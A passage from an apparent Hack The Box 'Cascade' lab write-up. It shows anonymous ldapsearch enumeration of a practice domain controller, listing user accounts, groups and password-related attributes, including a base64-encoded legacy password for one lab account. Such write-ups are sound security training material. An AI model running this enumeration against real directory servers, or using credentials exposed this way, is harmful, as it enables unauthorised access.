+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-80e8-8dbb-df2856da5498" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ ldapsearch -x -H ldap://10.10.10.182 -b &quot;dc=cascade,dc=local&quot;
+
+...Too much info so let&#x27;s reduce it...</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-8027-b7bc-d978567e6de8" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">                                                                                                                
+┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ ldapsearch -x -H ldap://10.10.10.182 -b &quot;OU=Users,OU=UK,DC=cascade,DC=local&quot; &quot;(objectclass=user)&quot;
+
+
+# extended LDIF
+#
+# LDAPv3
+# base &lt;OU=Users,OU=UK,DC=cascade,DC=local&gt; with scope subtree
+# filter: (objectclass=user)
+# requesting: ALL
+#
+
+# Steve Smith, Users, UK, cascade.local
+dn: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Steve Smith
+sn: Smith
+givenName: Steve
+distinguishedName: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
+instanceType: 4
+whenCreated: 20200109180813.0Z
+whenChanged: 20200323113113.0Z
+displayName: Steve Smith
+uSNCreated: 16404
+memberOf: CN=Audit Share,OU=Groups,OU=UK,DC=cascade,DC=local
+memberOf: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local
+memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
+uSNChanged: 295015
+name: Steve Smith
+objectGUID:: 39nrOPfEAE2an/UDQy/6fQ==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 132247275952778272
+lastLogoff: 0
+lastLogon: 132247275990842339
+scriptPath: MapAuditDrive.vbs
+pwdLastSet: 132247150854857364
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFUwQAAA==
+accountExpires: 9223372036854775807
+logonCount: 16
+sAMAccountName: s.smith
+sAMAccountType: 805306368
+userPrincipalName: s.smith@cascade.local
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200117033736.0Z
+dSCorePropagationData: 20200117001404.0Z
+dSCorePropagationData: 20200113163628.0Z
+dSCorePropagationData: 20200109180813.0Z
+dSCorePropagationData: 16010101000417.0Z
+lastLogonTimestamp: 132294366735115088
+
+# Ryan Thompson, Users, UK, cascade.local
+dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Ryan Thompson
+sn: Thompson
+givenName: Ryan
+distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
+instanceType: 4
+whenCreated: 20200109193126.0Z
+whenChanged: 20200323112031.0Z
+displayName: Ryan Thompson
+uSNCreated: 24610
+memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
+uSNChanged: 295010
+name: Ryan Thompson
+objectGUID:: LfpD6qngUkupEy9bFXBBjA==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 132247339091081169
+lastLogoff: 0
+lastLogon: 132247339125713230
+pwdLastSet: 132230718862636251
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
+accountExpires: 9223372036854775807
+logonCount: 2
+sAMAccountName: r.thompson
+sAMAccountType: 805306368
+userPrincipalName: r.thompson@cascade.local
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200126183918.0Z
+dSCorePropagationData: 20200119174753.0Z
+dSCorePropagationData: 20200119174719.0Z
+dSCorePropagationData: 20200119174508.0Z
+dSCorePropagationData: 16010101000000.0Z
+lastLogonTimestamp: 132294360317419816
+msDS-SupportedEncryptionTypes: 0
+cascadeLegacyPwd: clk0bjVldmE=
+
+# James Wakefield, Users, UK, cascade.local
+dn: CN=James Wakefield,OU=Users,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: James Wakefield
+sn: Wakefield
+givenName: James
+distinguishedName: CN=James Wakefield,OU=Users,OU=UK,DC=cascade,DC=local
+instanceType: 4
+whenCreated: 20200109203444.0Z
+whenChanged: 20200115215201.0Z
+displayName: James Wakefield
+uSNCreated: 28741
+uSNChanged: 118849
+name: James Wakefield
+objectGUID:: 6SX/H/Sf5UOkC8IjbIii7A==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+scriptPath: MapDataDrive.vbs
+pwdLastSet: 132230756844150124
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFXAQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: j.wakefield
+sAMAccountType: 805306368
+userPrincipalName: j.wakefield@cascade.local
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200117033736.0Z
+dSCorePropagationData: 20200117001404.0Z
+dSCorePropagationData: 20200113163628.0Z
+dSCorePropagationData: 20200109203444.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Stephanie Hickson, Users, UK, cascade.local
+dn: CN=Stephanie Hickson,OU=Users,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Stephanie Hickson
+sn: Hickson
+givenName: Stephanie
+distinguishedName: CN=Stephanie Hickson,OU=Users,OU=UK,DC=cascade,DC=local
+instanceType: 4
+whenCreated: 20200113012427.0Z
+whenChanged: 20200115215221.0Z
+displayName: Stephanie Hickson
+uSNCreated: 65594
+memberOf: CN=HR,OU=Groups,OU=UK,DC=cascade,DC=local
+uSNChanged: 118853
+name: Stephanie Hickson
+objectGUID:: rCGbAiT7r0CiOzKwLPa8NQ==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+scriptPath: MapDataDrive.vbs
+pwdLastSet: 132233522678003963
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFYQQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: s.hickson
+sAMAccountType: 805306368
+userPrincipalName: s.hickson@cascade.local
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200117033736.0Z
+dSCorePropagationData: 20200117001404.0Z
+dSCorePropagationData: 20200113163628.0Z
+dSCorePropagationData: 20200113012427.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# John Goodhand, Users, UK, cascade.local
+dn: CN=John Goodhand,OU=Users,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: John Goodhand
+sn: Goodhand
+givenName: John
+distinguishedName: CN=John Goodhand,OU=Users,OU=UK,DC=cascade,DC=local
+instanceType: 4
+whenCreated: 20200113014026.0Z
+whenChanged: 20200115215154.0Z
+displayName: John Goodhand
+uSNCreated: 65614
+uSNChanged: 118848
+name: John Goodhand
+objectGUID:: 7TACWgpE/kqlMHRot3JgpQ==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+scriptPath: MapDataDrive.vbs
+pwdLastSet: 132233532260320793
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFYgQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: j.goodhand
+sAMAccountType: 805306368
+userPrincipalName: j.goodhand@cascade.local
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200117033736.0Z
+dSCorePropagationData: 20200117001404.0Z
+dSCorePropagationData: 20200113163628.0Z
+dSCorePropagationData: 20200113014026.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Adrian Turnbull, Users, UK, cascade.local
+dn: CN=Adrian Turnbull,OU=Users,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Adrian Turnbull
+sn: Turnbull
+givenName: Adrian
+distinguishedName: CN=Adrian Turnbull,OU=Users,OU=UK,DC=cascade,DC=local
+instanceType: 4
+whenCreated: 20200113014313.0Z
+whenChanged: 20200113034534.0Z
+displayName: Adrian Turnbull
+uSNCreated: 65635
+uSNChanged: 94281
+name: Adrian Turnbull
+objectGUID:: PkhsX7HK0UKVFdwqFTWrnQ==
+userAccountControl: 66080
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132233533933579732
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFZAQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: a.turnbull
+sAMAccountType: 805306368
+userPrincipalName: a.turnbull@cascade.local
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200117033736.0Z
+dSCorePropagationData: 20200117001404.0Z
+dSCorePropagationData: 20200113163628.0Z
+dSCorePropagationData: 20200113015223.0Z
+dSCorePropagationData: 16030216172521.0Z
+msDS-SupportedEncryptionTypes: 0
+
+# Edward Crowe, Users, UK, cascade.local
+dn: CN=Edward Crowe,OU=Users,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Edward Crowe
+sn: Crowe
+givenName: Edward
+distinguishedName: CN=Edward Crowe,OU=Users,OU=UK,DC=cascade,DC=local
+instanceType: 4
+whenCreated: 20200113034502.0Z
+whenChanged: 20200128180707.0Z
+displayName: Edward Crowe
+uSNCreated: 94274
+uSNChanged: 245840
+name: Edward Crowe
+objectGUID:: spB7cioaike11C+BNt/oVg==
+userAccountControl: 66050
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+scriptPath: MapDataDrive.vbs
+pwdLastSet: 132233607021669462
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFZwQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: e.crowe
+sAMAccountType: 805306368
+userPrincipalName: e.crowe@cascade.local
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200117033736.0Z
+dSCorePropagationData: 20200117001404.0Z
+dSCorePropagationData: 20200113163628.0Z
+dSCorePropagationData: 20200113034502.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Ben Hanson, Users, UK, cascade.local
+dn: CN=Ben Hanson,OU=Users,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Ben Hanson
+sn: Hanson
+givenName: Ben
+distinguishedName: CN=Ben Hanson,OU=Users,OU=UK,DC=cascade,DC=local
+instanceType: 4
+whenCreated: 20200113163539.0Z
+whenChanged: 20200128180729.0Z
+displayName: Ben Hanson
+uSNCreated: 114734
+uSNChanged: 245841
+name: Ben Hanson
+objectGUID:: aiS9+OrNYE6UJnr8wuBpHg==
+userAccountControl: 66050
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132234069391538655
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFaAQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: b.hanson
+sAMAccountType: 805306368
+userPrincipalName: b.hanson@cascade.local
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200117033736.0Z
+dSCorePropagationData: 20200117001404.0Z
+dSCorePropagationData: 20200113163628.0Z
+dSCorePropagationData: 20200113163539.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# David Burman, Users, UK, cascade.local
+dn: CN=David Burman,OU=Users,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: David Burman
+sn: Burman
+givenName: David
+distinguishedName: CN=David Burman,OU=Users,OU=UK,DC=cascade,DC=local
+instanceType: 4
+whenCreated: 20200113163612.0Z
+whenChanged: 20200115215216.0Z
+displayName: David Burman
+uSNCreated: 114742
+uSNChanged: 118852
+name: David Burman
+objectGUID:: UqmXwgkl/0iy14P121+N7A==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+scriptPath: MapDataDrive.vbs
+pwdLastSet: 132234069729591249
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFaQQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: d.burman
+sAMAccountType: 805306368
+userPrincipalName: d.burman@cascade.local
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200117033736.0Z
+dSCorePropagationData: 20200117001404.0Z
+dSCorePropagationData: 20200113163628.0Z
+dSCorePropagationData: 20200113163613.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# ArkSvc, Services, Users, UK, cascade.local
+dn: CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: ArkSvc
+distinguishedName: CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
+instanceType: 4
+whenCreated: 20200109161820.0Z
+whenChanged: 20200323113833.0Z
+displayName: ArkSvc
+uSNCreated: 12799
+memberOf: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local
+memberOf: CN=AD Recycle Bin,OU=Groups,OU=UK,DC=cascade,DC=local
+memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
+uSNChanged: 295021
+name: ArkSvc
+objectGUID:: ELXj5FhFXUmr2tAqpnaTNA==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 132248055409887841
+pwdLastSet: 132230603002172876
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFUgQAAA==
+accountExpires: 9223372036854775807
+logonCount: 13
+sAMAccountName: arksvc
+sAMAccountType: 805306368
+userPrincipalName: arksvc@cascade.local
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200117033736.0Z
+dSCorePropagationData: 20200117001404.0Z
+dSCorePropagationData: 20200113163635.0Z
+dSCorePropagationData: 20200113163628.0Z
+dSCorePropagationData: 16010101000417.0Z
+lastLogonTimestamp: 132294371134322815
+
+# Util, Services, Users, UK, cascade.local
+dn: CN=Util,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Util
+distinguishedName: CN=Util,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
+instanceType: 4
+whenCreated: 20200109194521.0Z
+whenChanged: 20200128180947.0Z
+displayName: Util
+uSNCreated: 24650
+uSNChanged: 245850
+name: Util
+objectGUID:: GdAgZzaP8E6S7CzuIP8sag==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 132247085871071226
+pwdLastSet: 132233548311955855
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVwQAAA==
+accountExpires: 9223372036854775807
+logonCount: 1
+sAMAccountName: util
+sAMAccountType: 805306368
+userPrincipalName: util@cascade.local
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200117033736.0Z
+dSCorePropagationData: 20200117001404.0Z
+dSCorePropagationData: 20200113163635.0Z
+dSCorePropagationData: 20200113163628.0Z
+dSCorePropagationData: 16010101000417.0Z
+lastLogonTimestamp: 132247085871071226
+
+# BackupSvc, Services, Users, UK, cascade.local
+dn: CN=BackupSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: BackupSvc
+givenName: BackupSvc
+distinguishedName: CN=BackupSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
+instanceType: 4
+whenCreated: 20200113163703.0Z
+whenChanged: 20200113163732.0Z
+displayName: BackupSvc
+uSNCreated: 114757
+uSNChanged: 114765
+name: BackupSvc
+objectGUID:: /AeVxvZYJ0S4xu2RXKx+KA==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132234070231912131
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFagQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: BackupSvc
+sAMAccountType: 805306368
+userPrincipalName: BackupSvc@cascade.local
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200117033736.0Z
+dSCorePropagationData: 20200117001404.0Z
+dSCorePropagationData: 20200113163703.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Joseph Allen, Users, UK, cascade.local
+dn: CN=Joseph Allen,OU=Users,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Joseph Allen
+sn: Allen
+givenName: Joseph
+distinguishedName: CN=Joseph Allen,OU=Users,OU=UK,DC=cascade,DC=local
+instanceType: 4
+whenCreated: 20200113172359.0Z
+whenChanged: 20200115215149.0Z
+displayName: Joseph Allen
+uSNCreated: 114807
+uSNChanged: 118847
+name: Joseph Allen
+objectGUID:: HEPoVWJubkGd3J25ACGaRA==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+scriptPath: MapDataDrive.vbs
+pwdLastSet: 132234098399165604
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFbgQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: j.allen
+sAMAccountType: 805306368
+userPrincipalName: j.allen@cascade.local
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200117033736.0Z
+dSCorePropagationData: 20200117001404.0Z
+dSCorePropagationData: 20200113172359.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Ian Croft, Users, UK, cascade.local
+dn: CN=Ian Croft,OU=Users,OU=UK,DC=cascade,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Ian Croft
+sn: Croft
+givenName: Ian
+distinguishedName: CN=Ian Croft,OU=Users,OU=UK,DC=cascade,DC=local
+instanceType: 4
+whenCreated: 20200115214621.0Z
+whenChanged: 20200128180700.0Z
+displayName: Ian Croft
+uSNCreated: 118835
+uSNChanged: 245839
+name: Ian Croft
+objectGUID:: nRdObhMYfkOzzZt2y5gHxw==
+userAccountControl: 66050
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+scriptPath: MapDataDrive.vbs
+pwdLastSet: 132235983818652005
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFbwQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: i.croft
+sAMAccountType: 805306368
+userPrincipalName: i.croft@cascade.local
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+dSCorePropagationData: 20200117033736.0Z
+dSCorePropagationData: 20200117001404.0Z
+dSCorePropagationData: 20200115214621.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 15
+# numEntries: 14
+</code></pre><h3 id="18bd1b9f-8847-80ce-82ad-e41619a5152c" class="">Reducing more</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-8027-9a5c-e70f508a6227" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ ldapsearch -x -H ldap://10.10.10.182 -b &quot;OU=Users,OU=UK,DC=cascade,DC=local&quot; &quot;(objectclass=user)&quot; | grep userPrincipalName
+
+
+userPrincipalName: s.smith@cascade.local
+userPrincipalName: r.thompson@cascade.local
+userPrincipalName: j.wakefield@cascade.local
+userPrincipalName: s.hickson@cascade.local
+userPrincipalName: j.goodhand@cascade.local
+userPrincipalName: a.turnbull@cascade.local
+userPrincipalName: e.crowe@cascade.local
+userPrincipalName: b.hanson@cascade.local
+userPrincipalName: d.burman@cascade.local
+userPrincipalName: arksvc@cascade.local
+userPrincipalName: util@cascade.local
+userPrincipalName: BackupSvc@cascade.local
+userPrincipalName: j.allen@cascade.local
+userPrincipalName: i.croft@cascade.local
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-803c-9fdd-e5caa4f48657" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">──(drroot㉿drroot)-[~/Desktop/.htb/Cascade]
+└─$ ldapsearch -x -H ldap://10.10.10.182 -b &quot;OU=Users,OU=UK,DC=cascade,DC=local&quot; &quot;(objectclass=user)&quot; | grep name
+name: Steve Smith
+name: Ryan Thompson
+name: James Wakefield
+name: Stephanie Hickson
+name: John Goodhand
+name: Adrian Turnbull
+name: Edward Crowe
+name: Ben Hanson
+name: David Burman
+name: ArkSvc
+name: Util
+name: BackupSvc
+name: Joseph Allen
+name: Ian Croft
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-80f8-acfc-c361433e9e7e" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">─(drroot㉿drroot)-[~/Desktop/.htb/Cascade]
+└─$ ldapsearch -x -H ldap://10.10.10.182 -b &quot;OU=UK,DC=cascade,DC=local&quot; | grep -i pwd
+badPwdCount: 1
+pwdLastSet: 132247150854857364
+badPwdCount: 407
+pwdLastSet: 132230718862636251
+cascadeLegacyPwd: clk0bjVldmE=
+badPwdCount: 1
+pwdLastSet: 132230756844150124
+badPwdCount: 1
+pwdLastSet: 132233522678003963
+badPwdCount: 0
+pwdLastSet: 132233532260320793
+badPwdCount: 0
+pwdLastSet: 132233533933579732
+badPwdCount: 0
+pwdLastSet: 132233607021669462
+badPwdCount: 0
+pwdLastSet: 132234069391538655
+badPwdCount: 0
+pwdLastSet: 132234069729591249
+badPwdCount: 0
+pwdLastSet: 132230603002172876
+badPwdCount: 0
+pwdLastSet: 132233548311955855
+badPwdCount: 0
+pwdLastSet: 132234070231912131
+badPwdCount: 0
+pwdLastSet: 132234098399165604
+badPwdCount: 0
+pwdLastSet: 132235983818652005
+</code></pre><h3 id="18bd1b9f-8847-804a-8608-f28be77f22cb" class="">Resuming</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-8088-8ba0-f77f8b44ec13" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Cascade]
+└─$ ldapsearch -x -H ldap://10.10.10.182 -b &quot;OU=UK,DC=cascade,DC=local&quot; | grep -iE &quot;name|userPrincipalName|pwd&quot;
+distinguishedName: OU=UK,DC=cascade,DC=local
+name: UK
+distinguishedName: OU=Users,OU=UK,DC=cascade,DC=local
+name: Users
+givenName: Steve
+distinguishedName: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
+displayName: Steve Smith
+name: Steve Smith
+badPwdCount: 1
+pwdLastSet: 132247150854857364
+sAMAccountName: s.smith
+userPrincipalName: s.smith@cascade.local
+givenName: Ryan
+distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
+displayName: Ryan Thompson
+name: Ryan Thompson
+badPwdCount: 407
+pwdLastSet: 132230718862636251
+sAMAccountName: r.thompson
+userPrincipalName: r.thompson@cascade.local
+cascadeLegacyPwd: clk0bjVldmE=
+givenName: James
+distinguishedName: CN=James Wakefield,OU=Users,OU=UK,DC=cascade,DC=local
+displayName: James Wakefield
+name: James Wakefield
+badPwdCount: 1
+pwdLastSet: 132230756844150124
+sAMAccountName: j.wakefield
+userPrincipalName: j.wakefield@cascade.local
+givenName: Stephanie
+distinguishedName: CN=Stephanie Hickson,OU=Users,OU=UK,DC=cascade,DC=local
+displayName: Stephanie Hickson
+name: Stephanie Hickson
+badPwdCount: 1
+pwdLastSet: 132233522678003963
+sAMAccountName: s.hickson
+userPrincipalName: s.hickson@cascade.local
+givenName: John
+distinguishedName: CN=John Goodhand,OU=Users,OU=UK,DC=cascade,DC=local
+displayName: John Goodhand
+name: John Goodhand
+badPwdCount: 0
+pwdLastSet: 132233532260320793
+sAMAccountName: j.goodhand
+userPrincipalName: j.goodhand@cascade.local
+givenName: Adrian
